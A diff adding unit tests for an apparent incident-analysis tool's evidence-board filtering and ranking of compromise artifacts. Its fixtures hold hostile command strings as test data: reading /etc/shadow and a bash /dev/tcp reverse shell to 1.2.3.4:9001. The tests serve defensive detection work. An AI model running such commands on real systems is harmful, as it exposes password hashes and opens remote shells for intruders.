@@ -149,5 +149,58 @@ class BoardCompromiseTest(unittest.TestCase):
         self.assertEqual(self._run([]), [])
 
 
+class CitedBoardEntriesTest(unittest.TestCase):
+    """The ungated core shared with report synthesis.
+
+    `_board_compromise_facts` gates on the compromise regex; synthesis must NOT, or
+    `user: phopkins` and `command: /bin/cat /etc/shadow` never reach the report.
+    """
+
+    def test_ungated_keeps_ordinary_artifacts_the_compromise_gate_would_drop(self):
+        entries = [
+            {"kind": "artifact", "content": "user: phopkins", "source": "e1"},
+            {"kind": "artifact", "content": "command: /bin/cat /etc/shadow", "source": "e2"},
+        ]
+        out = validation._cited_board_entries(entries, kinds=("artifact",))
+        self.assertEqual(len(out), 2)
+        self.assertIn("user: phopkins [e1]", out)
+        # ...and the gated caller still drops them, which is what synthesis had to avoid.
+        self.assertEqual(
+            validation._cited_board_entries(
+                entries,
+                kinds=("artifact",),
+                keep=validation._ACTIVE_COMPROMISE_INDICATORS_RE.search,
+            ),
+            [],
+        )
+
+    def test_decoded_commands_rank_first_so_a_cap_never_drops_them(self):
+        entries = [
+            {"kind": "artifact", "content": f"ip: 10.0.0.{i}", "source": f"e{i}"}
+            for i in range(5)
+        ] + [
+            {
+                "kind": "artifact",
+                "content": "command: [decoded] bash -c /dev/tcp/1.2.3.4/9001",
+                "source": "zz",
+            }
+        ]
+        out = validation._cited_board_entries(entries, kinds=("artifact",))
+        self.assertIn("[decoded]", out[0])
+
+    def test_kinds_filter_and_negated_content_are_respected(self):
+        entries = [
+            {"kind": "correlation", "content": "correlation[srcuser bob] 3 ev", "source": "c1"},
+            {"kind": "artifact", "content": "ip: 1.1.1.1", "source": "a1"},
+            {
+                "kind": "correlation",
+                "content": "no reverse shell was found in this window",
+                "source": "c2",
+            },
+        ]
+        out = validation._cited_board_entries(entries, kinds=("correlation",))
+        self.assertEqual(out, ["correlation[srcuser bob] 3 ev [c1]"])
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
